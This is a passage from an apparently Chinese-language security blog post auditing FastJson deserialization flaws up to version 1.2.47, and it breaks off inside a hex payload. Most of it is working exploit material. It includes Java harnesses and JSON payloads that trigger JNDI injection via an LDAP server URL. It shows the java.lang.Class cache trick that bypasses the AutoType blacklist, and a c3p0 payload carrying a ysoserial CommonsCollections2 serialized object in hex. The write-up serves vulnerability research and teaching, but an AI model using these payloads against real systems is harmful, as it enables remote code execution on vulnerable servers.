class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiDataSourceFactory</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;properties\&quot;: &#123;&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;data_source\&quot;: \&quot;ldap://192.168.100.128:1389/Exploit\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(payload);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);    <span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746453492733-0058f151-d3f2-4474-9388-f561cab35e26.png"></p><h1 id="FastJson-1-2-46-1-2-47"><a href="#FastJson-1-2-46-1-2-47" class="headerlink" title="FastJson 1.2.46 - 1.2.47"></a>FastJson 1.2.46 - 1.2.47</h1><p>黑名单加了<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746454023763-4102227d-90c2-479a-a775-df4c9acb75c9.png"></p><p>通过<code>java.lang.Class</code>，将<code>JdbcRowSetImpl</code>类加载到<code>Map</code>中缓存，从而绕过AutoType的检测</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746459748737-18ef31f0-478b-4f0d-97c4-fcd104f92394.png"></p><h2 id="审计-6"><a href="#审计-6" class="headerlink" title="审计"></a>审计</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="不开启autotype"><a href="#不开启autotype" class="headerlink" title="不开启autotype"></a>不开启<code>autotype</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br><span class="hljs-comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;a\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.100.128:1389/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(payload);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);<span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>因为<code>autotype</code>关闭了，所以不会进入到黑名单那部分，</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746532522158-3262b26c-ddae-4d14-9e7b-ababc738338b.png"></p><p>然后调用<code>com.alibaba.fastjson.util.IdentityHashMap#findClass</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746533648248-bee15fc9-5c22-48ac-9f50-d5d4358e51b2.png"></p><p>然后<code>return</code>给<code>checkAutoType()</code></p><p>然后调用<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>，如果键名不是<code>val</code>就抛出异常</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746533916872-afee9320-39c0-4111-b838-06a3746a3403.png"></p><p>然后对<code>val</code>的键值不是继承<code>String</code>类就返回</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746534154735-016720c1-d3f6-4b6d-b541-9fe04066657e.png"></p><p>然后到这个判断<code>java.lang.Class</code>继承是<code>Class</code>类，就调用<code>loadClass</code>，这一步不会经过<code>checkAutoType()</code>因为键值是<code>val</code>的而不是<code>@type</code>就绕过了黑名单</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746534258768-c4413ab9-03b9-4abd-b672-08ec6ac4755c.png"></p><p>然后将<code>com.sun.rowset.JdbcRowSetImpl</code>放到<code>mapping</code>映射缓存</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746534484321-2ef82a29-095a-42d5-a931-7ab59b76cec7.png"></p><p>至此，<code>payload</code>的上半部分处理完了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;a&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后到下半部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;b&quot;</span>:&#123;<br>       <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>       <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,<br>       <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>   &#125;<br><br></code></pre></td></tr></table></figure><p>然后匹配到键<code>@type</code>会再次进入<code>checkAutoType()</code>，因为没有开启<code>autotype</code>所以不会进入黑名单检测</p><p>然后到<code>getClassFromMapping</code>就会在<code>mapping</code>映射缓存读取到<code>com.sun.rowset.JdbcRowSetImpl</code>并返回，从而绕过了黑名单获取到了<code>com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746534900943-5fd59060-6431-4152-8c6d-da8017fbca40.png"></p><p>后面就是通过<code>JdbcRowSetImpl</code>来<code>jndi</code>注入了</p><p>整个gadget</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSON.parse() -&gt; a:<span class="hljs-meta">@type</span>:java.lang.Class-&gt; ParserConfig#checkAutoType -&gt; IdentityHashMap#findClass -&gt; a:val:com.sun.rowset.JdbcRowSetImpl -&gt; MiscCodec#deserialze -&gt; TypeUtils.loadClass(mappings.put) -&gt; b:<span class="hljs-meta">@type</span>:com.sun.rowset.JdbcRowSetImpl -&gt; ParserConfig#checkAutoType -&gt; TypeUtils#getClassFromMapping -&gt; TypeUtils.loadClass -&gt; JdbcRowSetImpl -&gt; setAutoCommit() -&gt; connect() -&gt; getDataSourceName()<br></code></pre></td></tr></table></figure><h3 id="开启autotype"><a href="#开启autotype" class="headerlink" title="开启autotype"></a>开启<code>autotype</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启autotype</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;a\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;b\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;ldap://192.168.100.128:1389/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(payload);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> JSON.parse(payload);<span class="hljs-comment">// 将 JSON 格式的字符串解析（反序列化）为 Java 对象</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>payload上半部分流程和前面一样</p><p>在下半部分第二次进入<code>checkAutoType()</code>的时候，因为开启了<code>autotype</code>所以会进入黑名单的检测，但是抛出异常的条件是<code>TypeUtils.getClassFromMapping(typeName) == null</code>，因为缓存有所以不成立，就不会抛出异常</p><p><img src="/mdimg/fastjson%E5%AE%A1%E8%AE%A1/1746537489226-ecaf5b25-4453-4da3-865d-7748f6f7ce9e.png"></p><p>后续流程和上面一样</p><p>gadget同上</p><h3 id="为什么1-2-25-1-2-32版本：不能开启AutoType-1-2-33-1-2-47版本：无论是否开启AutoType，都能成功利用"><a href="#为什么1-2-25-1-2-32版本：不能开启AutoType-1-2-33-1-2-47版本：无论是否开启AutoType，都能成功利用" class="headerlink" title="为什么1.2.25-1.2.32版本：不能开启AutoType 1.2.33-1.2.47版本：无论是否开启AutoType，都能成功利用"></a>为什么1.2.25-1.2.32版本：不能开启AutoType 1.2.33-1.2.47版本：无论是否开启AutoType，都能成功利用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.2.25-1.2.32版本：不能开启AutoType</span><br><span class="hljs-comment">//1.2.33-1.2.47版本：无论是否开启AutoType，都能成功利用</span><br></code></pre></td></tr></table></figure><p>因为在<code>1.2.33</code>之后<code>checkAutoType()</code>才有<code>TypeUtils.getClassFromMapping(typeName) == null</code>，因为判断用的<code>&amp;&amp;</code>逻辑运算两个条件，即使在黑名单中也因为缓存不为<code>null</code>而无法抛出异常</p><p>所以≤ <code>1.2.32</code>不能进入黑名单检测，所以只能关闭<code>autotype</code>来绕过</p><h1 id="FastJson-≤-1-2-47"><a href="#FastJson-≤-1-2-47" class="headerlink" title="FastJson ≤ 1.2.47"></a>FastJson ≤ 1.2.47</h1><h2 id="com-mchange-v2-c3p0-WrapperConnectionPoolDataSource不出网利用"><a href="#com-mchange-v2-c3p0-WrapperConnectionPoolDataSource不出网利用" class="headerlink" title="com.mchange.v2.c3p0.WrapperConnectionPoolDataSource不出网利用"></a>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource不出网利用</h2><p>pom</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">4.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;com.mchange&lt;/groupId&gt;<br>    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">0.11</span><span class="hljs-number">.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/java -jar ../y</span>soserial-all.jar CommonsCollections2 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; ..<span class="hljs-regexp">/../</span>Calc.txt<br></code></pre></td></tr></table></figure><p>转16进制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000069CCAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B01000768616E646C65720100414C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07002801003379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F6164010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740100146A6176612F696F2F53657269616C697A61626C65010039636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F5472616E736C6574457863657074696F6E01001F79736F73657269616C2F7061796C6F6164732F7574696C2F476164676574730100083C636C696E69743E0100116A6176612F6C616E672F52756E74696D6507002A01000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B0C002C002D0A002B002E01000863616C632E65786508003001000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0C003200330A002B003401000D537461636B4D61705461626C6501001D79736F73657269616C2F50776E6572333734323337373836333635333501001F4C79736F73657269616C2F50776E657233373432333737383633363533353B002100020003000100040001001A000500060001000700000002000800040001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000002F000E0000000C000100000005000F003800000001001300140002000C0000003F0000000300000001B100000002000D00000006000100000034000E00000020000300000001000F0038000000000001001500160001000000010017001800020019000000040001001A00010013001B0002000C000000490000000400000001B100000002000D00000006000100000038000E0000002A000400000001000F003800000000000100150016000100000001001C001D000200000001001E001F00030019000000040001001A00080029000B0001000C00000024000300020000000FA70003014CB8002F1231B6003557B1000000010036000000030001030002002000000002002100110000000A000100020023001000097571007E0018000001D4CAFEBABE00000032001B0A0003001507001707001807001901001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C75650571E669EE3C6D47180100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010003466F6F01000C496E6E6572436C61737365730100254C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F3B01000A536F7572636546696C6501000C476164676574732E6A6176610C000A000B07001A01002379736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324466F6F0100106A6176612F6C616E672F4F626A6563740100146A6176612F696F2F53657269616C697A61626C6501001F79736F73657269616C2F7061796C6F6164732F7574696C2F47616467657473002100020003000100040001001A000500060001000700000002000800010001000A000B0001000C0000002F00010001000000052AB70001B100000002000D0000000600010000003C000E0000000C000100000005000F001200000002001300000002001400110000000A000100020016001000097074000450776E727077010078737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B02000078700000000178<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;e&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;f&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<br>        <span class="hljs-string">&quot;userOverridesAsString&quot;</span>: <span class="hljs-string">&quot;HexAsciiSerializedMap:ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B787000000002737200426F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E5472616E73666F726D696E67436F6D70617261746F722FF984F02BB108CC0200024C00096465636F726174656471007E00014C000B7472616E73666F726D657274002D4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E73342F5472616E73666F726D65723B7870737200406F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E636F6D70617261746F72732E436F6D70617261626C65436F6D70617261746F72FBF49925B86EB13702000078707372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E73342E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000E6E65775472616E73666F726D6572757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007704000000037372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E000B4C00055F6E616D6571007E000A4C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000002757200025B42ACF317F8060854E002000078700000069CCAFEBABE0000003200390A0003002207003707002507002601001073657269616C56657273696F6E5549440100014A01000D436F6E7374616E7456616C756505AD2093F391DDEF3E0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C6501000474686973010013537475625472616E736C65745061796C6F616401000C496E6E6572436C61737365730100354C79736F73657269616C2F7061796C6F6164732F7574696C2F4761646765747324537475625472616E736C65745061796C6F61643B0100097472616E73666F726D010072284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B5B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B2956010008646F63756D656E7401002D4C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B01000868616E646C6572730100425B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B01000A457863657074696F6E730700270100A6284C636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F444F4D3B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D2F44544D417869734974657261746F723B4C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F73657269616C697A65722F53657269616C697A6174696F6E48616E646C65723B29560100086974657261746F720100354C636F6D2F73756E2F6F72672F6170616368652F786D6C2F696E7465726E616C2F64746D